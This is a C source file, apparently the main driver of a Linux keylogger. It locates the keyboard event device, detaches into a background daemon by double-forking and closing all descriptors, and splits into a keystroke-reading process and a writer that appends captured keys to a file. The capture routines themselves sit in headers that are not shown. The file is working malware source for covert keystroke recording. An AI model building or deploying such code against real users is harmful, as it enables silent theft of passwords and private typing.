#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>

#include "find_event_file.h"
#include "keylogger.h"
#include "file_writer.h"

pid_t midPpid;

void parent_handler(int sig) {
    printf("Daemon started\n");
}

void mid_parent_handler(int sig) {
    kill(midPpid, SIGINT);
}

void start_daemon() {
    pid_t pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0) {
        struct sigaction handler;
        handler.sa_handler = &parent_handler;
        sigaction(SIGINT, &handler, NULL);
        pause();
        exit(EXIT_SUCCESS);
    }

    // Now we are in the child process
    usleep(100000);

    if (setsid() < 0)
        exit(EXIT_FAILURE);

    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0) {
        midPpid = getppid();
        struct sigaction handler;
        handler.sa_handler = &mid_parent_handler;
        sigaction(SIGINT, &handler, NULL);
        pause();
        exit(EXIT_SUCCESS);
    }

    // Now we are in the daemon process
    usleep(100000);

    umask(S_IRUSR | S_IWUSR);
    chdir("/");

    // Close all open file descriptors
    for (int fd = (int)sysconf(_SC_OPEN_MAX); fd >= 0; fd--) {
        close(fd);
    }

    kill(getppid(), SIGINT);
    usleep(100000);

    // Open the log file
    openlog("demon_keylogger", LOG_PID, LOG_DAEMON);
    syslog(LOG_INFO, "Daemon started");
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s output-file\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *kbFilePath = get_keyboard_event_file();
    if (kbFilePath == NULL) {
        printf("Couldn't find keyboard file, try to run as superuser\n");
        exit(EXIT_FAILURE);
    }
    char *outFilePath = argv[1];

    start_daemon();

    int pipeFd[2];
    int keyboardFd;
    int outFd;

    if (pipe(pipeFd) < 0) {
        syslog(LOG_CRIT, "Error creating pipe: %m");
        return 1;
    }

    keyboardFd = open(kbFilePath, O_RDONLY);

    if ((outFd = open(outFilePath, O_WRONLY | O_APPEND | O_CREAT, S_IROTH)) < 0) {
        syslog(LOG_CRIT, "Error opening output file: %m");
        exit(EXIT_FAILURE);
    }

    pid_t pid = fork();

    if (pid < 0) {
        syslog(LOG_CRIT, "fork: %m");
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        // Keylogger process
        close(pipeFd[0]);
        keylogger(keyboardFd, pipeFd[1]);
    } else {
        // Writer process
        close(pipeFd[1]);
        file_writer(pipeFd[0], outFd);
    }

    return 0;
}
